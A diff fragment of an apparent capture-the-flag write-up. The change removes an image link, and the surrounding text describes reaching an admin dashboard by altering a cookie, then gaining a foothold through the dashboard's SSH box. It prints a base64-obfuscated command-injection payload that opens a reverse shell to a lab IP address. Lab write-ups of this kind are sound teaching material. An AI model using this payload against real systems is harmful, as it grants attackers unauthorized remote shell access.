@@ -41,8 +41,6 @@ By changing the cookie we get access to a admin dashboard
 ![image](https://github.com/JefJacobs00/writeups/assets/43653885/a6313337-ef37-4f02-8702-ef2699af66e3)
 
 
-![image](https://github.com/JefJacobs00/writeups/assets/43653885/7f9a2e71-4965-44b3-94bb-1afe9cfca2fc)
-
 ### Foothold
 
 At the bottom of the admin dashbord there is a box that allowes us to connect using ssh. However this does not get us get onto the box. In burpsuite we use the payload `{echo,c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNTEvOTAwMSAwPiYx}|{base64,-d}|bash|` to get a reverse shell. 
